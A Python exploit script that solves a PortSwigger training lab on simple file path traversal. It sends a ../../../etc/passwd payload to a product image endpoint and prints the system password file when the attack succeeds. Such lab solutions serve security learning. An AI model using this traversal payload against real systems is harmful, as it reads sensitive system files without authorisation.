"""
Lab: File path traversal, simple case
Link: https://portswigger.net/web-security/file-path-traversal/lab-simple

Description:
    This lab contains a path traversal vulnerability in the display of product images.
    To solve the lab, retrieve the contents of the /etc/passwd file.

Solution:
    The image endpoint at /image?filename= is vulnerable to directory traversal.
    By supplying ../../../etc/passwd as the filename, we traverse out of the
    image directory and read /etc/passwd.
"""

import sys
import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── ANSI colors ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def print_banner():
    banner = f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Lab 01 – File Path Traversal (Simple Case)                 ║
║  https://portswigger.net/web-security/file-path-traversal   ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)


def exploit(url, path, payload, proxy=None):
    """
    Send the traversal payload to the target URL and display the response.
    """
    if proxy:
        proxy_url = f"http://{proxy}"
        proxies = {"http": proxy_url, "https": proxy_url}
    else:
        proxies = {}

    target = f"{url}{path}{payload}"

    print(f"{YELLOW}[*] Target  : {url}{RESET}")
    print(f"{YELLOW}[*] Path    : {path}{RESET}")
    print(f"{YELLOW}[*] Payload : {payload}{RESET}")
    print(f"{YELLOW}[*] Proxy   : {proxy if proxy else 'disabled'}{RESET}")
    print(f"{YELLOW}[*] Sending request...{RESET}\n")

    try:
        r = requests.get(target, verify=False, proxies=proxies, timeout=10)
    except requests.exceptions.ConnectionError:
        print(f"{RED}[✗] Connection failed. Is the lab running?{RESET}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"{RED}[✗] Request timed out.{RESET}")
        sys.exit(1)

    if r.status_code != 200:
        print(f"{RED}[✗] Unexpected status code: {r.status_code}{RESET}")
        sys.exit(1)

    if "root:x" in r.text:
        print(f"{GREEN}{BOLD}[✓] Exploit successful!{RESET}")
        print(f"{GREEN}[✓] Contents of /etc/passwd:{RESET}\n")
        print(r.text)
    else:
        print(f"{RED}[✗] Exploit failed – /etc/passwd not found in response.{RESET}")
        print(f"{YELLOW}[*] Response body:{RESET}\n")
        print(r.text)
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        add_help=False,
        description="PortSwigger Lab 01 – File path traversal, simple case",
        epilog="Example: python3 %(prog)s https://<lab-id>.web-security-academy.net /image?filename= ../../../etc/passwd",
    )
    parser.add_argument("url")
    parser.add_argument("path")
    parser.add_argument("payload")
    parser.add_argument("-p", "--proxy", metavar="HOST:PORT")

    args = parser.parse_args()

    url = args.url.rstrip("/")

    print_banner()
    exploit(url, args.path, args.payload, proxy=args.proxy)


if __name__ == "__main__":
    main()